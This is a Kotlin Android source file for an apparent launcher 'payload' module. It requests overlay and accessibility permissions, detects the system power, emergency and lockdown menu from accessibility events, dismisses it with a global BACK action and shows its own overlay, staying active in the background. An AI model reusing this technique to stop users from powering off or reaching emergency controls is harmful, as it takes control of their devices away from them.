package com.speedster.payload

import android.content.Context
import androidx.compose.runtime.*
import androidx.compose.ui.platform.LocalLifecycleOwner
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import com.speedster.DynamicEntry
import kotlinx.coroutines.withContext
import kotlinx.coroutines.Dispatchers
import java.io.File

import android.view.KeyEvent
import android.os.Vibrator
import android.os.VibrationEffect
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.Alignment
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.unit.dp
import android.view.accessibility.AccessibilityEvent

class PayloadEntry : DynamicEntry {
    enum class SetupStep { HOME, OVERLAY, ACCESSIBILITY, READY }

    @Composable
    override fun Render(context: Context, resDir: File) {
        val engine = remember { LauncherEngine(context) }
        var apps by remember { mutableStateOf<List<AppModel>>(emptyList()) }
        var currentStep by remember { mutableStateOf(SetupStep.HOME) }
        var showPowerMenu by remember { mutableStateOf(false) }
        var showLogs by remember { mutableStateOf(false) }
        val lifecycleOwner = LocalLifecycleOwner.current

        fun updateStep() {
            try {
                DynamicEntry.log("⚙️ Checking Perms -> Home: ${engine.isHomeApp()} | Overlay: ${engine.hasOverlayPermission()} | Acc: ${engine.isAccessibilityEnabled()}")
            } catch (e: Exception) {
                DynamicEntry.log("💥 Perm check error: ${e.message}")
            }
            currentStep = when {
                !engine.hasOverlayPermission() -> SetupStep.OVERLAY
                !engine.isAccessibilityEnabled() -> SetupStep.ACCESSIBILITY
                else -> SetupStep.READY
            }
        }

        var lastPowerDown by remember { mutableLongStateOf(0L) }

        LaunchedEffect(Unit) {
            try {
                DynamicEntry.log("🔥 PAYLOAD BOOT SEQUENCE INITIATED")
                DynamicEntry.log("📱 DEVICE: ${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL} (API ${android.os.Build.VERSION.SDK_INT})")
            } catch (e: Throwable) {
                DynamicEntry.log("💥 BOOT ERROR: ${e.stackTraceToString()}")
            }
            
            updateStep()
            
            var accEventCount = 0L
            DynamicEntry.accessibilityInterceptor = { event ->
                try {
                    accEventCount++
                    val type = event.eventType
                    val pkg = event.packageName?.toString()?.lowercase() ?: ""
                    val cls = event.className?.toString()?.lowercase() ?: ""
                    
                    if (accEventCount % 50L == 0L) {
                        DynamicEntry.log("💓 Acc Heartbeat: Received $accEventCount events so far. Last: $pkg")
                    }

                    if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                        DynamicEntry.log("🪟 WIN_STATE: pkg=$pkg | cls=$cls")
                    }

                    // For Samsung, Power menu can trigger either STATE_CHANGED or CONTENT_CHANGED
                    if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                        // Target system overlays AND Samsung's GlobalActions
                        if (pkg.contains("systemui") || pkg == "android" || pkg.contains("cocktailbarservice") || pkg.contains("globalactions") || pkg.contains("power")) {
                            var isPowerMenu = false
                            DynamicEntry.log("🔍 Scanning Target: $pkg (Event Type: $type)")
                            
                            if (pkg.contains("globalactions")) {
                                isPowerMenu = true
                                DynamicEntry.log("✅ Matched Samsung GlobalActions Package!")
                            }

                            // Method 1: Check high-level event text
                            val eventText = event.text.joinToString(" ").lowercase()
                            if (eventText.isNotBlank()) {
                                DynamicEntry.log("📝 Event Text: $eventText")
                            }
                            if (eventText.contains("power off") || eventText.contains("emergency mode") || eventText.contains("lockdown mode")) {
                                isPowerMenu = true
                                DynamicEntry.log("✅ Matched Event Text: $eventText")
                            }

                            // Method 2: Deep scan the accessibility nodes (More accurate for Samsung)
                            if (!isPowerMenu) {
                                fun scanNodes(node: android.view.accessibility.AccessibilityNodeInfo?, depth: Int): Boolean {
                                    if (node == null) return false
                                    if (depth > 5) return false // Prevent unbounded recursion
                                    
                                    val nodeText = (node.text ?: node.contentDescription)?.toString()?.lowercase() ?: ""
                                    if (nodeText.isNotBlank() && depth <= 2) {
                                        DynamicEntry.log("   ↳ Node Depth $depth: $nodeText")
                                    }
                                    
                                    if (nodeText.contains("power off") || nodeText.contains("emergency mode") || nodeText.contains("side key settings")) {
                                        DynamicEntry.log("✅ Matched UI Node: $nodeText")
                                        return true
                                    }
                                    
                                    for (i in 0 until node.childCount) {
                                        val child = try { node.getChild(i) } catch(e: Exception) { null }
                                        if (child != null) {
                                            val matched = scanNodes(child, depth + 1)
                                            child.recycle()
                                            if (matched) return true
                                        }
                                    }
                                    return false
                                }
                                
                                val rootNode = try { event.source } catch(e: Exception) { null }
                                if (rootNode != null) {
                                    DynamicEntry.log("🔎 Deep scanning node tree...")
                                    isPowerMenu = scanNodes(rootNode, 0)
                                    rootNode.recycle() // Prevent memory leaks
                                } else {
                                    DynamicEntry.log("⚠️ event.source is NULL. Cannot deep scan.")
                                }
                            }

                            // Method 3: Fallback to class name check
                            if (!isPowerMenu) {
                                if (cls.contains("globalactions", ignoreCase = true) || cls.contains("power", ignoreCase = true)) {
                                    isPowerMenu = true
                                    DynamicEntry.log("⚠️ Fallback Matched Class: $cls")
                                }
                            }

                            if (isPowerMenu) {
                                DynamicEntry.log("🚀 INTERCEPTING POWER MENU!")
                                // ⚔️ Kill the system UI menu via global back action
                                DynamicEntry.activeAccessibilityService?.performGlobalAction(
                                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK
                                )

                                val vib = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                                    vib.vibrate(VibrationEffect.createOneShot(50, VibrationEffect.DEFAULT_AMPLITUDE))
                                } else {
                                    @Suppress("DEPRECATION")
                                    vib.vibrate(50)
                                }
                                
                                // 🚀 Draw the custom overlay
                                DynamicEntry.overlayContent = { 
                                    PowerMenuOverlay(onDismiss = { 
                                        DynamicEntry.log("Closing custom overlay.")
                                        DynamicEntry.overlayContent = null 
                                    }) 
                                }
                            } else {
                                DynamicEntry.log("❌ Ignore: Not a power menu.")
                            }
                        }
                    }
                } catch(e: Throwable) {
                    DynamicEntry.log("💥 ACC CRASH: ${e.message}")
                }
            }

            DynamicEntry.keyInterceptor = { event ->
                false // Pass keys through. KEYCODE_POWER is hard-blocked by Android OS. We rely strictly on Window State Changes.
            }
        }

        DisposableEffect(lifecycleOwner) {
            val observer = LifecycleEventObserver { _, event ->
                if (event == Lifecycle.Event.ON_RESUME) updateStep()
            }
            lifecycleOwner.lifecycle.addObserver(observer)
            onDispose { 
                lifecycleOwner.lifecycle.removeObserver(observer)
                // CRITICAL FIX: Do NOT clear the interceptors here.
                // The payload must remain active in the background even if the UI unmounts!
            }
        }

        if (showPowerMenu) {
            PowerMenuOverlay(onDismiss = { showPowerMenu = false })
        } else {
            Box(modifier = Modifier.fillMaxSize()) {
                when (currentStep) {
                    SetupStep.HOME -> { /* Deprecated - Bypassed for now */ }
                    SetupStep.OVERLAY -> OnboardingStep(
                        title = "Draw Over Apps",
                        desc = "This allows the shell to manage system gestures and overlays.",
                        buttonText = "Enable Overlay",
                        onAction = { engine.openOverlaySettings() }
                    )
                    SetupStep.ACCESSIBILITY -> OnboardingStep(
                        title = "Accessibility",
                        desc = "Required for programmatic tapping and system key interception.",
                        buttonText = "Grant Access",
                        onAction = { engine.openAccessibilitySettings() }
                    )
                    SetupStep.READY -> {
                        LaunchedEffect(Unit) {
                            try {
                                DynamicEntry.log("✅ Permissions OK. Loading Apps...")
                                withContext(Dispatchers.IO) {
                                    val loadedApps = engine.getInstalledApps()
                                    withContext(Dispatchers.Main) { apps = loadedApps }
                                }
                            } catch (e: Throwable) {
                                DynamicEntry.log("💥 APP LOAD ERROR: ${e.stackTraceToString()}")
                            }
                        }
                        LauncherScreen(apps = apps, engine = engine, onAppClick = { engine.launchApp(it) })
                        
                        FloatingActionButton(
                            onClick = { showLogs = true },
                            modifier = Modifier
                                .align(Alignment.BottomEnd)
                                .padding(16.dp),
                            containerColor = Color(0xFF3D5AFE)
                        ) {
                            Text("Logs", color = Color.White)
                        }
                    }
                }
                
                if (showLogs) {
                    SystemLogOverlay(onDismiss = { showLogs = false })
                }
            }
        }
    }
}